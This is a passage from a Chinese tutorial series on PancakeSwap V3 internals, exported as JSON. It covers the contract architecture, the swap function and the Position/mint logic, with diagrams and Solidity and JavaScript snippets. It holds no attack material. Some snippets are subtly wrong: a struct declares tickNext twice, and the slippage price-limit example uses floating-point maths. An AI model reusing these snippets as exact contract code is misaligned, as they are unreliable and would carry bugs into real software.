P1[&quot;高效查找下一个tick&quot;]\n        P2[&quot;位运算优化存储&quot;]\n        P3[&quot;快速遍历区间&quot;]\n        P4[&quot;降低gas成本&quot;]\n    end\n\n    TickBitmap --&gt; Purpose\n\n    style TickBitmap fill:#ffeb3b\n\nTickBitmap原理：\ngraph TB\n    subgraph Bitmap[&quot;Tick位图&quot;]\n        B0[&quot;Word 0&lt;br/&gt;ticks 0-255&quot;]\n        B1[&quot;Word 1&lt;br/&gt;ticks 256-511&quot;]\n        B2[&quot;Word 2&lt;br/&gt;ticks 512-767&quot;]\n        BN[&quot;Word N&lt;br/&gt;ticks N*256-(N+1)*256-1&quot;]\n    end\n\n    subgraph Bit[&quot;单个位&quot;]\n        BT[&quot;1位 = 1个tick&lt;br/&gt;1=已初始化&lt;br/&gt;0=未初始化&quot;]\n    end\n\n    subgraph Operation[&quot;位运算&quot;]\n        O1[&quot;OR: 设置位&quot;]\n        O2[&quot;AND: 查询位&quot;]\n        O3[&quot;SHR: 位移查找&quot;]\n    end\n\n    Bitmap --&gt; Bit\n    Bit --&gt; Operation\n\n    style Bitmap fill:#ffeb3b\n\n\n5. 外围合约设计\n5.1 NonfungiblePositionManager\ngraph TB\n    subgraph NFTPM[&quot;NonfungiblePositionManager&quot;]\n        F1[&quot;createPosition&quot;]\n        F2[&quot;increaseLiquidity&quot;]\n        F3[&quot;decreaseLiquidity&quot;]\n        F4[&quot;collect&quot;]\n        F5[&quot;burn&quot;]\n    end\n\n    subgraph Benefits[&quot;优势&quot;]\n        B1[&quot;简化LP操作&quot;]\n        B2[&quot;NFT化管理&quot;]\n        B3[&quot;自动费用计算&quot;]\n        B4[&quot;用户体验优化&quot;]\n    end\n\n    NFTPM --&gt; Benefits\n\n    style NFTPM fill:#ffeb3b\n\n5.2 SwapRouter\ngraph LR\n    subgraph Router[&quot;SwapRouter&quot;]\n        F1[&quot;exactInputSingle&quot;]\n        F2[&quot;exactInput&quot;]\n        F3[&quot;exactOutputSingle&quot;]\n        F4[&quot;exactOutput&quot;]\n    end\n\n    subgraph Features[&quot;功能&quot;]\n        FT1[&quot;单池交换&quot;]\n        FT2[&quot;多池路由&quot;]\n        FT3[&quot;精确输入&quot;]\n        FT4[&quot;精确输出&quot;]\n    end\n\n    Router --&gt; Features\n\n    style Router fill:#ffeb3b\n\n\n6. PancakeSwap V3的架构优化\n6.1 Gas优化策略\nmindmap\n  root((PancakeSwap V3&lt;br/&gt;Gas优化))\n    存储优化\n      Slot0打包\n      紧凑数据结构\n      映射优化\n    计算优化\n      位运算替代乘除\n      预计算常量\n      内联库函数\n    操作优化\n      批量操作支持\n      重入保护优化\n      事件精简\n    BNB Chain优化\n      低gas环境\n      更快确认\n      更低成本\n\n6.2 多链适配\ngraph LR\n    subgraph Chains[&quot;已部署链&quot;]\n        BSC[BNB Chain]\n        ETH[Ethereum]\n        APT[Aptos]\n    end\n\n    subgraph Adaptations[&quot;适配调整&quot;]\n        A1[Gas优化策略]\n        A2[区块时间调整]\n        A3[预言机配置]\n        A4[费率层级]\n    end\n\n    Chains --&gt; Adaptations\n\n    style BSC fill:#ffeb3b\n    style ETH fill:#e3f2fd\n    style APT fill:#c8e6c9\n\n\n7. 合约交互流程\n7.1 创建池子流程\nsequenceDiagram\n    participant U as 用户\n    participant F as Factory\n    participant P as Pool合约\n    participant D as Deployer\n\n    U-&gt;&gt;F: createPool(tokenA, tokenB, fee)\n    F-&gt;&gt;F: 检查参数有效性\n    F-&gt;&gt;F: 地址排序\n    F-&gt;&gt;F: 检查费率等级\n    F-&gt;&gt;F: 检查池子是否已存在\n    F-&gt;&gt;D: deploy(参数)\n    D-&gt;&gt;P: 创建Pool合约实例\n    P-&gt;&gt;P: 初始化状态\n    P-&gt;&gt;F: 返回池子地址\n    F-&gt;&gt;F: 存储映射关系\n    F-&gt;&gt;F: 发射PoolCreated事件\n    F--&gt;&gt;U: 返回池子地址\n\n7.2 添加流动性流程\nsequenceDiagram\n    participant LP as LP\n    participant PM as PositionManager\n    participant P as Pool\n    participant T as Tick\n\n    LP-&gt;&gt;PM: mint(参数)\n    PM-&gt;&gt;PM: 计算所需代币数量\n    LP-&gt;&gt;PM: transfer代币\n    PM-&gt;&gt;P: mint(流动性)\n    P-&gt;&gt;P: 更新流动性\n    P-&gt;&gt;P: 更新tick信息\n    P-&gt;&gt;T: 更新tick边界\n    P-&gt;&gt;PM: 返回结果\n    PM-&gt;&gt;PM: 创建NFT\n    PM--&gt;&gt;LP: 返回tokenId\n\n7.3 交易流程\nsequenceDiagram\n    participant T as 交易者\n    participant R as Router\n    participant P as Pool\n    participant TB as TickBitmap\n\n    T-&gt;&gt;R: swap(参数)\n    R-&gt;&gt;P: swap(零地址, amount)\n    P-&gt;&gt;P: 检查重入锁\n    P-&gt;&gt;P: 计算价格影响\n    loop 跨越多个tick\n        P-&gt;&gt;TB: 查找下一个tick\n        TB--&gt;&gt;P: tick索引\n        P-&gt;&gt;P: 更新流动性\n        P-&gt;&gt;P: 更新价格\n    end\n    P-&gt;&gt;P: 转移代币\n    P-&gt;&gt;P: 更新观察\n    P-&gt;&gt;P: 发射Swap事件\n    P--&gt;&gt;R: 返回结果\n    R--&gt;&gt;T: 返回结果\n\n\n8. 本章小结\n8.1 架构核心要点\nmindmap\n  root((PancakeSwap V3&lt;br/&gt;架构要点))\n    Factory\n      池子创建\n      费率管理\n      多费率支持\n    Pool\n      状态管理\n      交易执行\n      费用计算\n      预言机功能\n    Libraries\n      TickMath\n      SwapMath\n      TickBitmap\n      Position\n    Periphery\n      PositionManager\n      SwapRouter\n      Quoter\n    优化\n      Gas优化\n      多链适配\n      社区治理\n\n8.2 关键数据结构速查\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n结构位置用途Slot0Pool核心状态（价格、tick等）Position.InfoPool流动性头寸信息Tick.InfoPoolTick级别数据ObservationPool预言机观察数据\n\n下一篇预告\n在下一篇文章中，我们将深入探讨V3与Uniswap V3对比，包括：\n\n架构差异对比\n代码优化分析\nGas效率对比\n适用场景选择\n\n\n参考资料\n\nPancakeSwap V3 Core 源码\nPancakeSwap V3 Periphery 源码\nPancakeSwap V3 架构文档\n"},"blockchainguide/DApp_Development/应用场景/defi/pancake/v3/04-交换机制深度解析":{"slug":"blockchainguide/DApp_Development/应用场景/defi/pancake/v3/04-交换机制深度解析","filePath":"blockchainguide/DApp_Development/应用场景/defi/pancake/v3/04-交换机制深度解析.md","title":"04-交换机制深度解析","links":[],"tags":[],"content":"死磕PancakeSwap V3（四）：交换机制深度解析\n\n本文是「死磕PancakeSwap V3」系列的第四篇，深入剖析V3的核心交换函数swap()的完整执行流程。\n\n系列导航\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n序号标题核心内容01PancakeSwap V3概述发展历程、集中流动性、V3特色02Tick机制与价格数学Tick设计、价格转换算法03架构与合约设计Factory、Pool合约结构04交换机制深度解析swap函数、价格发现05流动性管理与头寸Position、mint/burn06费用系统与预言机费用分配、TWAP07V3与Uniswap V3对比差异点、优化、适用场景08多链部署与特性适配BNB Chain、Ethereum、跨链策略09集成开发指南SDK使用、交易构建、最佳实践10MEV与套利策略JIT、三明治攻击、防范策略\n\n1. 交换函数概览\n1.1 swap函数的核心职责\nswap函数是PancakeSwap V3中最复杂也最核心的函数，负责处理所有代币交换逻辑：\nflowchart TB\n    subgraph InputParams[&quot;输入参数&quot;]\n        R[recipient&lt;br/&gt;接收地址]\n        Z[zeroForOne&lt;br/&gt;交换方向]\n        A[amountSpecified&lt;br/&gt;指定数量]\n        S[sqrtPriceLimitX96&lt;br/&gt;价格限制]\n        D[data&lt;br/&gt;回调数据]\n    end\n\n    subgraph SwapFunctions[&quot;swap函数职责&quot;]\n        P1[价格发现]\n        P2[跨Tick遍历]\n        P3[流动性管理]\n        P4[费用计算]\n        P5[预言机更新]\n        P6[代币转账]\n    end\n\n    subgraph Output[&quot;输出&quot;]\n        O1[amount0&lt;br/&gt;token0变化量]\n        O2[amount1&lt;br/&gt;token1变化量]\n    end\n\n    R --&gt; P1\n    Z --&gt; P2\n    A --&gt; P3\n    S --&gt; P4\n    D --&gt; P5\n    P1 --&gt; O1\n    P2 --&gt; O1\n    P3 --&gt; O2\n    P4 --&gt; O2\n    P5 --&gt; O1\n    P6 --&gt; O2\n\n    style SwapFunctions fill:#ffeb3b\n\n1.2 函数签名详解\nfunction swap(\n    address recipient,          // 输出代币接收地址\n    bool zeroForOne,           // true: token0→token1, false: token1→token0\n    int256 amountSpecified,    // 正数=精确输入, 负数=精确输出\n    uint160 sqrtPriceLimitX96, // 价格滑点保护限制\n    bytes calldata data        // 回调函数的附加数据\n) external override noDelegateCheck returns (\n    int256 amount0,            // token0的净变化量\n    int256 amount1             // token1的净变化量\n);\n参数含义详解：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n参数类型说明recipientaddress接收输出代币的地址zeroForOnebool交换方向标志amountSpecifiedint256正数=exactInput，负数=exactOutputsqrtPriceLimitX96uint160最大允许的价格变动databytes传递给回调函数的数据\n1.3 交换方向与价格关系\nflowchart LR\n    subgraph TrueGroup[&quot;zeroForOne = true&quot;]\n        A1[卖出token0]\n        A2[买入token1]\n        A3[价格下降]\n        A4[tick减小]\n        A1 --&gt; A2\n        A2 --&gt; A3\n        A3 --&gt; A4\n    end\n\n    subgraph FalseGroup[&quot;zeroForOne = false&quot;]\n        B1[卖出token1]\n        B2[买入token0]\n        B3[价格上升]\n        B4[tick增大]\n        B1 --&gt; B2\n        B2 --&gt; B3\n        B3 --&gt; B4\n    end\n\n    style TrueGroup fill:#ffcdd2\n    style FalseGroup fill:#c8e6c9\n\n\n2. 核心数据结构\n2.1 SwapState：交换状态追踪\nSwapState结构体在整个交换循环中追踪状态变化：\nstruct SwapState {\n    // 剩余待交换的数量\n    int256 amountSpecifiedRemaining;\n \n    // 已计算的对应数量\n    int256 amountCalculated;\n \n    // 当前价格\n    uint160 sqrtPriceX96;\n \n    // 当前tick\n    int24 tick;\n \n    // 输入代币的全局费用增长率\n    uint256 feeGrowthGlobalX128;\n \n    // 协议费用累积\n    uint128 protocolFee;\n \n    // 当前有效流动性\n    uint128 liquidity;\n}\ngraph TB\n    subgraph SwapStateStruct[&quot;SwapState结构&quot;]\n        S1[amountSpecifiedRemaining&lt;br/&gt;剩余交换量]\n        S2[amountCalculated&lt;br/&gt;已计算量]\n        S3[sqrtPriceX96&lt;br/&gt;当前价格]\n        S4[tick&lt;br/&gt;当前tick]\n        S5[feeGrowthGlobalX128&lt;br/&gt;费用增长率]\n        S6[protocolFee&lt;br/&gt;协议费用]\n        S7[liquidity&lt;br/&gt;当前流动性]\n    end\n\n    subgraph StateEvolution[&quot;状态演变&quot;]\n        E1[初始化]\n        E2[每步更新]\n        E3[最终状态]\n    end\n\n    E1 --&gt;|&quot;设置&quot;| S1\n    E1 --&gt;|&quot;设置&quot;| S2\n    E1 --&gt;|&quot;设置&quot;| S3\n    E1 --&gt;|&quot;设置&quot;| S4\n    E1 --&gt;|&quot;设置&quot;| S5\n    E1 --&gt;|&quot;设置&quot;| S6\n    E1 --&gt;|&quot;设置&quot;| S7\n\n    S1 --&gt;|&quot;循环更新&quot;| E2\n    S2 --&gt;|&quot;循环更新&quot;| E2\n    S3 --&gt;|&quot;循环更新&quot;| E2\n    S4 --&gt;|&quot;循环更新&quot;| E2\n    S5 --&gt;|&quot;循环更新&quot;| E2\n    S6 --&gt;|&quot;循环更新&quot;| E2\n    S7 --&gt;|&quot;循环更新&quot;| E2\n\n    E2 --&gt;|&quot;循环结束&quot;| E3\n\n    style SwapStateStruct fill:#ffeb3b\n\n2.2 SwapCache：交换缓存\nSwapCache存储交换过程中不变或很少变化的数据：\nstruct SwapCache {\n    // 交换开始时的流动性\n    uint128 liquidityStart;\n \n    // 区块时间戳\n    uint32 blockTimestamp;\n \n    // 交易前一刻的价格\n    uint160 sqrtPriceX96;\n \n    // 交易前一刻的tick\n    int24 tick;\n \n    // 交易开始时的观察索引\n    uint16 observationIndex;\n \n    // 交易前的累计价格（预言机）\n    int56 tickCumulative;\n \n    // 交易前的秒/流动性累积\n    uint160 secondsPerLiquidityCumulativeX128;\n}\n2.3 StepComputations：单步计算\nstruct StepComputations {\n    // 下一个tick\n    int24 tickNext;\n \n    // 下一个tick的sqrtPrice\n    uint160 sqrtPriceNextX96;\n \n    // 本步的起始sqrtPrice\n    uint160 sqrtPriceStartX96;\n \n    // 本步的流动性\n    uint128 liquidity;\n \n    // 本步的费用\n    uint256 feeAmount;\n \n    // 跨越tick后的tick边界\n    int24 tickNext;\n}\n\n3. 交换流程详解\n3.1 完整流程图\nflowchart TD\n    A[开始swap] --&gt; B{检查重入锁}\n    B --&gt;|locked| C[回滚]\n    B --&gt;|unlocked| D[初始化状态]\n    D --&gt; E[调用uniswapV3SwapCallback]\n    E --&gt; F[计算交易费用]\n    F --&gt; G{还有剩余数量?}\n    G --&gt;|否| H[结束循环]\n    G --&gt;|是| I[查找下一个tick]\n    I --&gt; J{会跨越tick?}\n    J --&gt;|是| K[计算到tick边界的交换]\n    J --&gt;|否| L[计算到目标数量的交换]\n    K --&gt; M[更新价格和tick]\n    M --&gt; N[更新流动性]\n    N --&gt; O[更新费用增长]\n    O --&gt; P[更新预言机]\n    P --&gt; G\n    L --&gt; M\n    H --&gt; Q[发送输出代币]\n    Q --&gt; R[发射Swap事件]\n    R --&gt; S[返回结果]\n\n    style D fill:#ffeb3b\n    style S fill:#c8e6c9\n\n3.2 精确输入 vs 精确输出\ngraph LR\n    subgraph ExactInput[&quot;精确输入模式&quot;]\n        EI1[amountSpecified &gt; 0]\n        EI2[指定输入数量]\n        EI3[计算输出数量]\n        EI4[amountCalculated为负]\n    end\n\n    subgraph ExactOutput[&quot;精确输出模式&quot;]\n        EO1[amountSpecified &lt; 0]\n        EO2[指定输出数量]\n        EO3[计算输入数量]\n        EO4[amountCalculated为正]\n    end\n\n    style ExactInput fill:#e3f2fd\n    style ExactOutput fill:#fff3e0\n\n代码逻辑：\n// 判断交换类型\nbool exactInput = amountSpecified &gt; 0;\n \n// 精确输入：指定输入，计算输出\nif (exactInput) {\n    state.amountSpecifiedRemaining = amountSpecified;\n    state.amountCalculated = type(int256).min;\n}\n// 精确输出：指定输出，计算输入\nelse {\n    state.amountSpecifiedRemaining = -amountSpecified;\n    state.amountCalculated = type(int256).max;\n}\n\n4. 跨Tick遍历算法\n4.1 Tick查找策略\nflowchart TD\n    A[需要跨越tick] --&gt; B{交换方向?}\n\n    B --&gt;|zeroForOne=true| C[向左遍历&lt;br/&gt;tick减小]\n    B --&gt;|zeroForOne=false| D[向右遍历&lt;br/&gt;tick增大]\n\n    C --&gt; E[使用TickBitmap&lt;br/&gt;查找下一个初始化tick]\n    D --&gt; E\n\n    E --&gt; F{找到下一个tick?}\n    F --&gt;|是| G[更新tickNext]\n    F --&gt;|否| H[使用MIN/MAX tick]\n\n    G --&gt; I[计算跨越tick的交换量]\n    H --&gt; I\n\n    style E fill:#ffeb3b\n\n4.2 TickBitmap查找算法\n// 使用TickBitmap高效查找下一个tick\n(int24 tickNext, bool initialized) =\n    TickBitmap.nextInitializedTickWithinOneWord(\n        state.tick,\n        tickSpacing,\n        zeroForOne\n    );\n查找效率：\ngraph LR\n    subgraph LinearSearch[&quot;线性查找&quot;]\n        L1[复杂度: O{n}]\n        L2[遍历每个tick]\n        L3[Gas成本高]\n    end\n\n    subgraph BitmapSearch[&quot;位图查找&quot;]\n        B1[复杂度: O{1}]\n        B2[位运算快速定位]\n        B3[Gas成本低]\n    end\n\n    style BitmapSearch fill:#c8e6c9\n    style LinearSearch fill:#ffcdd2\n\n4.3 跨越Tick的处理\nsequenceDiagram\n    participant Pool as Pool合约\n    participant Bitmap as TickBitmap\n    participant Tick as Tick.Info\n    participant Oracle as Oracle库\n\n    Pool-&gt;&gt;Bitmap: 查找下一个tick\n    Bitmap--&gt;&gt;Pool: tickNext, initialized\n    Pool-&gt;&gt;Pool: 计算到tick边界的交换\n    Pool-&gt;&gt;Tick: 更新tick信息\n    Pool-&gt;&gt;Tick: 更新流动性\n    Pool-&gt;&gt;Oracle: 更新观察数据\n    Pool-&gt;&gt;Pool: 更新价格\n\n\n5. 价格发现机制\n5.1 价格更新算法\n// 根据交换量更新价格\nstep.sqrtPriceNextX96 = SwapMath.getNextSqrtPriceFromInput(\n    state.sqrtPriceX96,\n    state.liquidity,\n    state.amountSpecifiedRemaining,\n    zeroForOne\n);\n数学原理：\n假设：\n- 当前价格：P_cur\n- 交换量：Δx (输入token0)\n- 流动性：L\n- 新价格：P_new\n\n如果 zeroForOne = true (卖出token0)：\nΔy = L × (√P_cur - √P_new)\nP_new = (L / (L + Δx))² × P_cur\n\n如果 zeroForOne = false (卖出token1)：\nΔx = L × (1/√P_cur - 1/√P_new)\nP_new = (L / (L - Δy))² × P_cur\n\n5.2 滑点保护\n// 检查价格是否超出限制\nif (zeroForOne) {\n    require(\n        state.sqrtPriceX96 &gt;= sqrtPriceLimitX96,\n        &quot;price limit&quot;\n    );\n} else {\n    require(\n        state.sqrtPriceX96 &lt;= sqrtPriceLimitX96,\n        &quot;price limit&quot;\n    );\n}\n滑点计算示例：\n// 计算最大允许滑点\nconst slippageTolerance = 0.005; // 0.5%\nconst minOutput = expectedOutput * (1 - slippageTolerance);\n \n// 设置sqrtPriceLimitX96\nconst sqrtPriceLimitX96 = Math.sqrt(\n    currentPrice * (1 - slippageTolerance)\n) * (2 ** 96);\n\n6. 费用计算与分配\n6.1 费用计算\n// 计算本步的费用\nstep.feeAmount = FullMath.mulDiv(\n    step.amountIn,           // 输入数量\n    fee,                      // 费率（如500 = 0.05%）\n    1e6                       // 基数\n);\n费率对应关系：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n费率fee值百分比0.01%100100/1,000,0000.05%500500/1,000,0000.25%25002,500/1,000,0001.00%1000010,000/1,000,000\n6.2 费用分配\n// 更新全局费用增长率\nif (state.liquidity &gt; 0) {\n    state.feeGrowthGlobalX128 += FullMath.mulDiv(\n        step.feeAmount,           // 本步产生的费用\n        FixedPoint128.Q128,       // 2^128 归一化因子\n        state.liquidity           // 当前活跃流动性\n    );\n}\n分配逻辑：\ngraph LR\n    subgraph Fee[交易费用]\n        F1[总费用]\n    end\n\n    subgraph Distribution[分配]\n        D1[LP费用&lt;br/&gt;feeGrowthGlobal]\n        D2[协议费用&lt;br/&gt;protocolFee]\n    end\n\n    F1 --&gt; D1\n    F1 --&gt; D2\n\n    style Fee fill:#ffeb3b\n    style Distribution fill:#c8e6c9\n\n\n7. PancakeSwap V3的优化\n7.1 Gas优化策略\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n优化项PancakeSwap V3Uniswap V3Tick查找优化的位运算标准位运算费用计算减少乘除法标准计算状态更新紧凑存储标准存储循环优化减少分支标准逻辑\n7.2 多链适配优化\nmindmap\n  root((多链Gas优化))\n    BNB Chain\n      大区块\n      低gas\n      优化存储访问\n    Ethereum\n      小区块\n      高gas\n      优化计算路径\n    Aptos\n      并行执行\n      极低成本\n      利用Move特性\n\n\n8. 实际应用示例\n8.1 简单Swap示例\n// 使用PancakeSwap V3 SDK\nimport { PancakeV3Router } from &#039;@pancakeswap/sdk&#039;;\n \nconst router = new PancakeV3Router(routerAddress, provider);\n \n// 精确输入：指定输入，接受输出\nconst tx = await router.exactInputSingle({\n    tokenIn: CAKE_ADDRESS,\n    tokenOut: WBNB_ADDRESS,\n    fee: 2500,  // 0.25%\n    recipient: userAddress,\n    amountIn: ethers.utils.parseEther(&#039;100&#039;),\n    amountOutMinimum: ethers.utils.parseEther(&#039;4.9&#039;),  // 滑点保护\n    sqrtPriceLimitX96: 0\n});\n \nawait tx.wait();\n8.2 多跳Swap示例\n// 多跳路径：CAKE -&gt; WBNB -&gt; USDT\nconst tx = await router.exactInput({\n    path: [\n        {\n            tokenIn: CAKE_ADDRESS,\n            tokenOut: WBNB_ADDRESS,\n            fee: 2500\n        },\n        {\n            tokenIn: WBNB_ADDRESS,\n            tokenOut: USDT_ADDRESS,\n            fee: 500\n        }\n    ],\n    recipient: userAddress,\n    amountIn: ethers.utils.parseEther(&#039;100&#039;),\n    amountOutMinimum: ethers.utils.parseUnits(&#039;995&#039;, 6),\n    sqrtPriceLimitX96: 0\n});\n\n9. 本章小结\n9.1 Swap函数核心要点\nmindmap\n  root((Swap函数&lt;br/&gt;核心要点))\n    状态追踪\n      SwapState\n      SwapCache\n      StepComputations\n    价格发现\n      Tick遍历\n      价格更新\n      滑点保护\n    流动性管理\n      跨tick处理\n      流动性更新\n      TickBitmap查找\n    费用系统\n      费用计算\n      费用分配\n      协议费用\n    预言机更新\n      观察数据\n      累积价格\n      TWAP计算\n\n9.2 关键函数速查\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n函数功能位置swap()核心交换函数PancakeV3PooluniswapV3SwapCallback()回调函数调用者实现getNextSqrtPriceFromInput()计算新价格SwapMathnextInitializedTickWithinOneWord()查找下一个tickTickBitmap\n\n下一篇预告\n在下一篇文章中，我们将深入探讨流动性管理与头寸，包括：\n\nPosition数据结构详解\nMint/Burn操作流程\n费用计算与收取\nNFT头寸管理\n\n\n参考资料\n\nPancakeSwap V3 Core 源码\nPancakeSwap V3 SwapRouter\nPancakeSwap V3 交易文档\n"},"blockchainguide/DApp_Development/应用场景/defi/pancake/v3/05-流动性管理与头寸":{"slug":"blockchainguide/DApp_Development/应用场景/defi/pancake/v3/05-流动性管理与头寸","filePath":"blockchainguide/DApp_Development/应用场景/defi/pancake/v3/05-流动性管理与头寸.md","title":"05-流动性管理与头寸","links":[],"tags":[],"content":"死磕PancakeSwap V3（五）：流动性管理与头寸\n\n本文是「死磕PancakeSwap V3」系列的第五篇，深入剖析V3的流动性管理机制、Position数据结构以及mint/burn操作的完整实现。\n\n系列导航\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n序号标题核心内容01PancakeSwap V3概述发展历程、集中流动性、V3特色02Tick机制与价格数学Tick设计、价格转换算法03架构与合约设计Factory、Pool合约结构04交换机制深度解析swap函数、价格发现05流动性管理与头寸Position、mint/burn06费用系统与预言机费用分配、TWAP07V3与Uniswap V3对比差异点、优化、适用场景08多链部署与特性适配BNB Chain、Ethereum、跨链策略09集成开发指南SDK使用、交易构建、最佳实践10MEV与套利策略JIT、三明治攻击、防范策略\n\n1. 流动性管理概述\n1.1 V3流动性的独特性\n与V2不同，V3的流动性是非同质化的。每个流动性头寸都是独特的：\nflowchart TB\n    subgraph V2Group[&quot;V2 流动性 (ERC20)&quot;]\n        V2LP[LP Token]\n        V2A[LP A: 100 LP]\n        V2B[LP B: 100 LP]\n        V2C[LP C: 100 LP]\n        V2NOTE[所有LP权益相同&lt;br/&gt;可相互替代]\n        V2LP --&gt; V2A\n        V2LP --&gt; V2B\n        V2LP --&gt; V2C\n    end\n\n    subgraph V3Group[&quot;V3 流动性 (ERC721)&quot;]\n        V3NFT[NFT Position]\n        V3A[&quot;LP A: [1800,2200]&lt;br/&gt;L=1000&quot;]\n        V3B[&quot;LP B: [1900,2100]&lt;br/&gt;L=500&quot;]\n        V3C[&quot;LP C: [2000,2500]&lt;br/&gt;L=2000&quot;]\n        V3NOTE[每个头寸独特&lt;br/&gt;不可替代]\n        V3NFT --&gt; V3A\n        V3NFT --&gt; V3B\n        V3NFT --&gt; V3C\n    end\n\n    style V2Group fill:#ffcdd2\n    style V3Group fill:#ffeb3b\n\n1.2 核心操作流程\nflowchart LR\n    subgraph AddGroup[&quot;添加流动性&quot;]\n        M1[选择价格区间]\n        M2[计算所需代币]\n        M3[调用mint]\n        M4[获得NFT头寸]\n        M1 --&gt; M2\n        M2 --&gt; M3\n        M3 --&gt; M4\n    end\n\n    subgraph ManageGroup[&quot;管理流动性&quot;]\n        P1[增加流动性]\n        P2[收取费用]\n        P3[减少流动性]\n        P1 --&gt; P2\n        P2 --&gt; P3\n    end\n\n    subgraph RemoveGroup[&quot;移除流动性&quot;]\n        B1[调用burn]\n        B2[获得代币]\n        B3[调用collect]\n        B4[取回费用]\n        B1 --&gt; B2\n        B2 --&gt; B3\n        B3 --&gt; B4\n    end\n\n    AddGroup --&gt; ManageGroup\n    ManageGroup --&gt; RemoveGroup\n\n    style AddGroup fill:#ffeb3b\n    style ManageGroup fill:#fff3e0\n    style RemoveGroup fill:#c8e6c9\n\n\n2. Position数据结构\n2.1 Position.Info详解\n每个流动性头寸由唯一的三元组标识：(owner, tickLower, tickUpper)\nlibrary Position {\n    struct Info {\n        // 此头寸的流动性数量\n        uint128 liquidity;\n \n        // 上次更新时的内部费用增长率\n        // 用于计算自上次操作以来累积的费用\n        uint256 feeGrowthInside0LastX128;\n        uint256 feeGrowthInside1LastX128;\n \n        // 待领取的费用（已结算但未提取）\n        uint128 tokensOwed0;\n        uint128 tokensOwed1;\n    }\n}\ngraph TB\n    subgraph PosGroup[&quot;Position.Info 结构&quot;]\n        L[liquidity&lt;br/&gt;uint128&lt;br/&gt;流动性数量]\n        FG0[feeGrowthInside0LastX128&lt;br/&gt;uint256&lt;br/&gt;token0费用增长快照]\n        FG1[feeGrowthInside1LastX128&lt;br/&gt;uint256&lt;br/&gt;token1费用增长快照]\n        TO0[tokensOwed0&lt;br/&gt;uint128&lt;br/&gt;待领取token0]\n        TO1[tokensOwed1&lt;br/&gt;uint128&lt;br/&gt;待领取token1]\n    end\n\n    subgraph FuncGroup[&quot;功能分类&quot;]\n        流动性管理[流动性管理]\n        费用追踪[费用追踪]\n        待领取[待领取费用]\n    end\n\n    L --&gt; 流动性管理\n    FG0 --&gt; 费用追踪\n    FG1 --&gt; 费用追踪\n    TO0 --&gt; 待领取\n    TO1 --&gt; 待领取\n\n    style PosGroup fill:#ffeb3b\n\n2.2 Position的唯一标识\n/// @notice 获取头寸信息\nfunction get(\n    mapping(bytes32 =&gt; Info) storage self,\n    address owner,\n    int24 tickLower,\n    int24 tickUpper\n) internal view returns (Position.Info storage position) {\n    // 使用keccak256哈希三元组作为键\n    position = self[keccak256(abi.encodePacked(owner, tickLower, tickUpper))];\n}\nflowchart LR\n    subgraph InputGroup[&quot;输入&quot;]\n        O[owner地址]\n        TL[tickLower]\n        TU[tickUpper]\n    end\n\n    subgraph HashGroup[&quot;哈希计算&quot;]\n        PACK[&quot;abi.encodePacked(owner, tickLower, tickUpper)&quot;]\n        HASH[&quot;keccak256(...)&quot;]\n    end\n\n    subgraph StoreGroup[&quot;存储&quot;]\n        KEY[&quot;bytes32 key&quot;]\n        POS[&quot;positions[key]&quot;]\n    end\n\n    O --&gt; PACK\n    TL --&gt; PACK\n    TU --&gt; PACK\n    PACK --&gt; HASH\n    HASH --&gt; KEY\n    KEY --&gt; POS\n\n    style HashGroup fill:#ffeb3b\n\n2.3 费用快照机制\nsequenceDiagram\n    participant LP as 流动性提供者\n    participant Pool as 池子合约\n    participant Position as Position结构\n\n    LP-&gt;&gt;Pool: mint(tickLower, tickUpper, amount)\n    Pool-&gt;&gt;Position: 记录当前feeGrowthInside\n    Note over Position: feeGrowthInside0LastX128 = 当前值\n\n    Note over Pool: ... 交易发生，费用累积 ...\n\n    LP-&gt;&gt;Pool: collect(头寸)\n    Pool-&gt;&gt;Position: 计算费用增量\n    Note over Position: Δfee = (当前feeGrowthInside - 上次feeGrowthInside) × L\n    Pool-&gt;&gt;LP: 转账费用\n\n\n3. Mint操作详解\n3.1 Mint函数签名\nfunction mint(\n    address recipient,\n    int24 tickLower,\n    int24 tickUpper,\n    uint128 amount,\n    bytes calldata data\n) external override noDelegateCheck returns (\n    uint256 amount0,\n    uint256 amount1,\n    uint128 liquidity\n);\n参数说明：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n参数类型说明recipientaddress接收NFT的地址tickLowerint24价格区间下界tickUpperint24价格区间上界amountuint128期望添加的流动性databytes回调数据\n3.2 Mint执行流程\nflowchart TD\n    A[开始mint] --&gt; B{检查重入锁}\n    B --&gt;|locked| C[回滚]\n    B --&gt;|unlocked| D[验证tick区间]\n    D --&gt; E{tickLower &lt; tickUpper?}\n    E --&gt;|否| C\n    E --&gt;|是| F{tick间距对齐?}\n    F --&gt;|否| C\n    F --&gt;|是| G[计算所需代币数量]\n    G --&gt; H[检查代币余额]\n    H --&gt; I[调用IPancakeV3MintCallback]\n    I --&gt; J[检查回执余额]\n    J --&gt; K{金额足够?}\n    K --&gt;|否| C\n    K --&gt;|是| L[更新position]\n    L --&gt; M[更新tick信息]\n    M --&gt; N[更新流动性]\n    N --&gt; O[发射Mint事件]\n    O --&gt; P[返回结果]\n\n    style D fill:#ffeb3b\n    style P fill:#c8e6c9\n\n3.3 计算所需代币数量\n// 计算需要提供的代币数量\nif (slot0.tick &lt; tickLower) {\n    // 价格在区间下方：只提供token0\n    amount0 = SqrtPriceMath.getAmount0Delta(\n        sqrtPriceAX96,\n        sqrtPriceBX96,\n        liquidity,\n        false\n    );\n    amount1 = 0;\n} else if (slot0.tick &lt; tickUpper) 